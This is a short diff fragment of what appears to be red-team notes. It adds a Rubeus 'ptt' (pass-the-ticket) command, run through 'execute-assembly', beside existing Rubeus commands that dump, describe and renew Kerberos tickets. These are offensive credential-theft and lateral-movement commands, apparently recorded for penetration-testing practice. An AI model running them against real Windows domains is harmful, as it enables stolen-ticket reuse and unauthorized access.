@@ -33,6 +33,8 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x1349
 ```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:
 
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
+
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
 ```
 
